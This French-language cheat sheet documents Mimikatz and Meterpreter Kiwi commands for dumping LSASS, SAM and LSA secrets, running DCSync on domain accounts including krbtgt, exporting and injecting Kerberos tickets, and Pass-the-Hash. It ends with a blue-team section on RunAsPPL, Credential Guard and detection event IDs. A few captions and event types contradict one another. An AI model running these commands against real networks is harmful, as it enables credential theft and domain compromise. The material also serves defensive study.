# Mimikatz & Kiwi — Extraction de Credentials, Kerberos & Détection

---

## 1. Privilèges & Mécanismes d'Accès Mémoire

### Élévation requise avant toute extraction
```
mimikatz # privilege::debug
→ Privilege '20' OK         (SeDebugPrivilege accordé)
```

```
mimikatz # token::elevate
→ Token elevated to SYSTEM  (impersonation du token SYSTEM)
```

!!! warning "Prérequis avant toute commande d'extraction"
    `privilege::debug` requiert d'être **administrateur local**. Sans ce privilège, toutes les commandes `sekurlsa::*` et `lsadump::*` échouent avec `ERROR kuhl_m_privilege_simple`. Sur un système avec EDR actif, l'accès en lecture à LSASS est intercepté même avec les droits admin.

### sekurlsa vs lsadump — Distinction fondamentale

| Module | Source | Prérequis | Contenu extrait |
| --- | --- | --- | --- |
| `sekurlsa` | Mémoire du processus `lsass.exe` | Admin + `SeDebugPrivilege` | Sessions actives, mots de passe en clair (WDigest), tickets Kerberos |
| `lsadump::sam` | Ruche de registre `SAM` | SYSTEM | Hashes NTLM des comptes locaux |
| `lsadump::secrets` | Ruche `SECURITY` (LSA Secrets) | SYSTEM | Mots de passe de services, DPAPI, comptes machine |
| `lsadump::dcsync` | Protocole DRS (réplication AD) | Domain Admin ou `DS-Replication-Get-Changes` | Hashes NTLM de n'importe quel compte AD |
| `lsadump::lsa /patch` | LSASS patché en mémoire | SYSTEM | Hashes NTLM + LSA Secrets sans accès registre |

---

## 2. Artefacts d'Authentification & Modules Principaux

### Module `sekurlsa` — Mémoire LSASS

```
# Extraire TOUS les credentials des sessions actives en une commande
mimikatz # sekurlsa::logonpasswords
```

```
# Cibler uniquement les credentials WDigest (mots de passe en clair si activé)
mimikatz # sekurlsa::wdigest
```

```
# Extraire les sessions Kerberos et les clés de session
mimikatz # sekurlsa::kerberos
```

```
# Extraire uniquement les hashes NTLM MSV (le plus ciblé, moins de bruit)
mimikatz # sekurlsa::msv
```

```
# Extraire les clés de chiffrement Kerberos (RC4/AES128/AES256)
mimikatz # sekurlsa::ekeys
```

```
# Lister les billets Kerberos en cache mémoire LSASS
mimikatz # sekurlsa::tickets
```

### Module `lsadump` — Registre / SAM / NTDS / DRS

```
# Dump de la base SAM locale (hashes NTLM des comptes locaux)
mimikatz # lsadump::sam
```

```
# Dump des secrets LSA (mots de passe services, machine account, DPAPI)
mimikatz # lsadump::secrets
```

```
# DCSync : extrait le hash NTLM d'un compte via le protocole de réplication AD
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt        # hash du compte KRBTGT (Golden Ticket)
mimikatz # lsadump::dcsync /domain:corp.local /all /csv           # tous les comptes du domaine en CSV
```

```
# Dump NTDS.dit hors ligne (fichier copié depuis le DC)
mimikatz # lsadump::lsa /patch
```

### Module `kerberos` — Billets TGT/TGS

```
# Lister les billets Kerberos présents dans le cache de la session courante
mimikatz # kerberos::list
```

```
# Exporter tous les billets en fichiers .kirbi dans le répertoire courant
mimikatz # kerberos::list /export
```

```
# Injecter un billet .kirbi dans le cache Kerberos de la session
mimikatz # kerberos::ptt ticket.kirbi
```

```
# Purger le cache Kerberos (nettoyage avant injection d'un nouveau billet)
mimikatz # kerberos::purge
```

### Synthèse — Tableau des modules principaux

| Commande | Module | Action |
| --- | --- | --- |
| `sekurlsa::logonpasswords` | sekurlsa | Sessions actives + mots de passe clairs + hashes |
| `sekurlsa::wdigest` | sekurlsa | Mots de passe en clair (WDigest) |
| `sekurlsa::msv` | sekurlsa | Hashes NTLM seuls |
| `sekurlsa::ekeys` | sekurlsa | Clés Kerberos (RC4/AES128/AES256) |
| `sekurlsa::tickets` | sekurlsa | Billets Kerberos en mémoire LSASS |
| `lsadump::sam` | lsadump | Hashes NTLM locaux (SAM) |
| `lsadump::secrets` | lsadump | Secrets LSA + comptes de service |
| `lsadump::dcsync /user:X` | lsadump | Hash NTLM d'un compte AD via DRS |
| `kerberos::list /export` | kerberos | Export .kirbi de tous les billets |
| `kerberos::ptt ticket.kirbi` | kerberos | Injection d'un billet en mémoire |
| `kerberos::purge` | kerberos | Purge du cache Kerberos |

---

## 3. Attaques sur les Hashs & Billets (Active Directory)

### Pass-the-Hash (PtH) — `sekurlsa::pth`

```
# Ouvrir un processus (cmd.exe) avec les droits du compte cible via son hash NTLM
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:aad3b435b51404eeaad3b435b51404ee /run:cmd.exe
```

```
# Paramètres de sekurlsa::pth
/user:    → nom d'utilisateur cible
/domain:  → domaine (ou WORKGROUP pour les comptes locaux)
/ntlm:    → hash NTLM (LM:NT ou NT seul)
/run:     → processus à spawner avec le token forgé (cmd.exe, powershell.exe...)
/aes256:  → clé AES256 (alternative au NTLM, plus discret)
```

### Pass-the-Ticket (PtT) & Overpass-the-Hash

```
# Pass-the-Ticket : injecter un TGT .kirbi exporté d'une autre session
mimikatz # kerberos::purge
mimikatz # kerberos::ptt C:\ticket_admin.kirbi
→ Tous les services Kerberos deviennent accessibles avec l'identité du billet injecté
```

```
# Overpass-the-Hash : convertir un hash NTLM en TGT Kerberos
# Obtenir d'abord un cmd avec sekurlsa::pth, puis demander un TGT depuis ce contexte
# Dans le cmd obtenu :
klist                         # vérifier que le TGT est bien obtenu
dir \\dc01\c$                 # accéder à un partage avec le TGT Kerberos
```

!!! note "PtH vs PtT vs OPtH"
    **PtH** réutilise le hash NTLM directement (authentification NTLM, pas Kerberos). **PtT** injecte un billet TGT/TGS existant (authentification Kerberos complète). **OPtH** utilise un hash NTLM pour obtenir un TGT Kerberos — combine les deux. PtH génère des événements NTLM (4624 type 3), PtT/OPtH génèrent des événements Kerberos (4768/4769).

---

## 4. Intégration Metasploit / Meterpreter (Kiwi)

```bash
# Charger l'extension Kiwi (Mimikatz intégré)
meterpreter > load kiwi
```

### Correspondances Mimikatz → Kiwi

| Commande Mimikatz | Équivalent Kiwi (Meterpreter) |
| --- | --- |
| `sekurlsa::logonpasswords` | `creds_all` |
| `lsadump::sam` | `lsa_dump_sam` |
| `lsadump::secrets` | `lsa_dump_secrets` |
| `lsadump::dcsync /user:X` | `dcsync_ntlm X` |
| `kerberos::list /export` | `kerberos_ticket_list` |
| `kerberos::ptt ticket.kirbi` | `kerberos_ticket_use /tmp/ticket.kirbi` |
| `kerberos::purge` | `kerberos_ticket_purge` |

```bash
meterpreter > creds_all                             # sekurlsa::logonpasswords complet
meterpreter > lsa_dump_sam                          # hashes locaux SAM
meterpreter > lsa_dump_secrets                      # secrets LSA
meterpreter > dcsync_ntlm Administrator             # hash NTLM du compte Administrator via DCSync
meterpreter > kerberos_ticket_list                  # liste les billets du cache
meterpreter > kerberos_ticket_use /tmp/ticket.kirbi # injecte un billet .kirbi
```

---

## 5. Détection & Mesures de Protection (Blue Team)

### LSA Protection — RunAsPPL
```powershell
# Activer la protection PPL de LSASS (empêche l'accès mémoire par des processus non signés)
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f
```

```powershell
# Vérifier l'état de RunAsPPL
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```

### Credential Guard (Windows 10+ / Server 2016+)
```
Credential Guard isole les secrets d'authentification dans un VTL1 (Virtual Secure Mode).
sekurlsa::logonpasswords → ne retourne plus de mots de passe en clair ni de hashes exploitables.
lsadump::dcsync → non affecté (protocole réseau, pas accès mémoire LSASS).
```

### Restriction de SeDebugPrivilege
```powershell
# Retirer SeDebugPrivilege des administrateurs locaux via GPO
# Computer Configuration → Windows Settings → Security Settings
# → User Rights Assignment → Debug Programs → (liste vide)
```

### Événements de sécurité clés

| Event ID | Journal | Déclencheur | Indicateur |
| --- | --- | --- | --- |
| `4656` | Security | Handle request sur LSASS | Tentative d'accès au processus LSASS |
| `4663` | Security | Accès objet LSASS | Lecture effective de la mémoire LSASS |
| `4624` (Type 9) | Security | Logon NewCredentials | Pass-the-Hash (NTLM) |
| `4768` | Security | TGT Request | Demande de TGT Kerberos |
| `4769` | Security | TGS Request | Demande de ticket de service (PtT) |
| `4672` | Security | Logon avec privilèges spéciaux | SeDebugPrivilege accordé |
| `10` (Sysmon) | Sysmon | Process Access LSASS | `mimikatz`, `procdump`, `lsass dump` |

!!! warning "Détection Sysmon Event ID 10"
    Sysmon Event ID 10 (`ProcessAccess`) ciblant `lsass.exe` avec `GrantedAccess = 0x1010` ou `0x1438` est la signature la plus fiable de Mimikatz ou d'un dump LSASS. Configurer une règle d'alerte SIEM sur `TargetImage=lsass.exe` + `GrantedAccess=0x1010|0x1438|0x143a`.
